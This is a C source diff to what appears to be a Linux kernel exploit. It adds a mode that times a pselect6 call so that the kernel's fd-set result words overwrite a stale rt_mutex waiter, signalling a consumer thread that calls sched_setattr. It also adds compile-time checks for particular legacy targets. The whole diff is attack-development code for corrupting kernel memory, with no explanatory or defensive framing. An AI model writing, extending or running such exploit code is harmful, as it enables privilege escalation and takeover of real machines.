@@ -7,6 +7,20 @@
 #ifndef SLIDE_PSELECT_WORD_SHIFT
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #endif
+#ifndef SLIDE_PSELECT_RESULT_ROUTE
+#define SLIDE_PSELECT_RESULT_ROUTE 0
+#endif
+#if SLIDE_PSELECT_RESULT_ROUTE && \
+    defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+#error "SLIDE_PSELECT_RESULT_ROUTE triggers after pselect returns"
+#endif
+#if SLIDE_PSELECT_RESULT_ROUTE && \
+    (!defined(LEGACY_RT_MUTEX_WAITER) || !LEGACY_RT_MUTEX_WAITER)
+#error "SLIDE_PSELECT_RESULT_ROUTE requires the legacy 0x50-byte waiter"
+#endif
+#if SLIDE_PSELECT_RESULT_ROUTE && SLIDE_PSELECT_WORD_SHIFT != 1
+#error "SLIDE_PSELECT_RESULT_ROUTE requires word shift 1"
+#endif
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
@@ -323,12 +337,22 @@ void slide_pselect_stack_copy(void) {
 
   int pipefd[2] = {-1, -1};
   SYSCHK(pipe(pipefd));
+#if SLIDE_PSELECT_RESULT_ROUTE
+  int block_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
+  if (block_fd < 0) {
+    pr_error("slide result-route open /dev/null errno=%d\n", errno);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+#else
   int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
   if (block_fd < 0) {
     pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
                errno);
     block_fd = pipefd[0];
   }
+#endif
   int high_read = fcntl(block_fd, F_DUPFD, slide_pselect_nfds + 16);
   if (high_read < 0) {
     pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
@@ -344,6 +368,21 @@ void slide_pselect_stack_copy(void) {
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
+#if SLIDE_PSELECT_RESULT_ROUTE
+  fd_set expected_in = in;
+  fd_set expected_out = out;
+  fd_set expected_ex = ex;
+  for (int fd = 0; fd < slide_pselect_nfds; fd++) {
+    if (FD_ISSET(fd, &ex)) {
+      pr_error("slide result-route cannot encode exception bit fd=%d\n", fd);
+      close(high_read);
+      close(block_fd);
+      close(pipefd[0]);
+      close(pipefd[1]);
+      return;
+    }
+  }
+#endif
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
   atomic_store(&slide_consume_stop, 0);
@@ -378,11 +417,37 @@ void slide_pselect_stack_copy(void) {
   for (int index = 0; index < slide_syscall_pad; index++) {
     syscall(SYS_gettid);
   }
+#if !SLIDE_PSELECT_RESULT_ROUTE
   atomic_store(&slide_consume_go, 1);
+#endif
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+#if SLIDE_PSELECT_RESULT_ROUTE
+  int result_ready =
+      ret > 0 && memcmp(&in, &expected_in, sizeof(in)) == 0 &&
+      memcmp(&out, &expected_out, sizeof(out)) == 0 &&
+      memcmp(&ex, &expected_ex, sizeof(ex)) == 0;
+  if (result_ready) {
+    /*
+     * core_sys_select has already materialized the selected descriptor masks
+     * in its result fd-sets. On legacy targets those result words overlap
+     * the stale waiter. Do not enter the kernel again on this thread before
+     * the consumer has issued sched_setattr against it.
+     */
+    atomic_store(&slide_consume_go, 1);
+    for (size_t spins = 0;
+         !atomic_load(&slide_consume_stop) && spins < 100000000ULL;
+         spins++) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+  } else {
+    pr_error("slide result-route fd-set mismatch ret=%d errno=%d\n",
+             ret, saved_errno);
+    atomic_store(&slide_consume_stop, 1);
+  }
+#endif
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
   atomic_store(&slide_consume_go, 0);
